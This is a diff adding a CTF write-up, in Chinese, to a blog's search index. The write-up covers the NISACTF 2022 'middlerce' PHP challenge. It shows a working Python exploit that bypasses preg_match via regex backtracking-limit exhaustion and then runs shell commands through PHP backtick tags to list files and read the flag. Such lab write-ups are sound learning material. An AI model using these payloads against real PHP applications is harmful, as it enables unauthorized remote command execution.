@@ -1,6 +1,51 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>[NISACTF 2022]middlerce</title>
+    <url>/2024/11/22/NISACTF-2022-middlerce/</url>
+    <content><![CDATA[<h1 id="NISACTF-2022-middlerce"><a href="#NISACTF-2022-middlerce" class="headerlink" title="[NISACTF 2022]middlerce"></a>[NISACTF 2022]middlerce</h1><h2 id="rce正则回溯绕过"><a href="#rce正则回溯绕过" class="headerlink" title="rce正则回溯绕过"></a>rce正则回溯绕过</h2><p>题目链接：<a href="https://www.nssctf.cn/problem/1897">https://www.nssctf.cn/problem/1897</a></p>
+ <span id="more"></span>
+
+<p>进入环境，看一下代码：</p>
+<p><img src="/2024/11/22/NISACTF-2022-middlerce/1.png" alt="img"></p>
+<p>这里的preg_match过滤了所有ASCII字符</p>
+<p>但是if语句是直接判断的，就可以考虑正则回溯绕过</p>
+<p>php中为了防止拒绝服务攻击，给 pcre 设定了一个回溯次数上限，一般是100万次，如果不行再加就可以了</p>
+<p>写个python脚本测试一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28685/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;phpinfo();&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;@&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;letter&#x27;</span>: payload&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<p>回显：</p>
+<p><img src="/2024/11/22/NISACTF-2022-middlerce/2.png" alt="img"></p>
+<p>猜测是被checkdata函数过滤了</p>
+<p>Fuzz一下</p>
+<p><img src="/2024/11/22/NISACTF-2022-middlerce/3.png" alt="img"></p>
+<p>长度198就是被过滤的，基本上都是用不了的，那只能php标签闭合，反引号执行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>``<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>相当于</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">echo</span> ... <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行获得flag的位置</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `ls /`?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;@&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/11/22/NISACTF-2022-middlerce/4.png" alt="img"></p>
+<p>然后</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `nl /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;@&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+<p>完整exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28325/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `nl /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;@&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">with open(&quot;123.txt&quot;,&#x27;w&#x27;) as f:</span></span><br><span class="line"><span class="string">    f.write(payload)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;letter&#x27;</span>: payload&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 POST 请求</span></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出响应内容</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/11/22/NISACTF-2022-middlerce/5.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>日常writeup</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[天翼杯 2021]esay_eval</title>
     <url>/2024/11/15/%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval/</url>
     <content><![CDATA[<h1 id="天翼杯-2021-esay-eval"><a href="#天翼杯-2021-esay-eval" class="headerlink" title="[天翼杯 2021]esay_eval"></a>[天翼杯 2021]esay_eval</h1><h2 id="php反序列化-redis提权"><a href="#php反序列化-redis提权" class="headerlink" title="php反序列化 + redis提权"></a>php反序列化 + redis提权</h2><p>题目链接：<a href="https://www.nssctf.cn/problem/364">https://www.nssctf.cn/problem/364</a></p>
@@ -218,9 +263,9 @@
         <category>比赛writeup</category>
       </categories>
       <tags>
-        <tag>web</tag>
         <tag>misc</tag>
         <tag>crypto</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
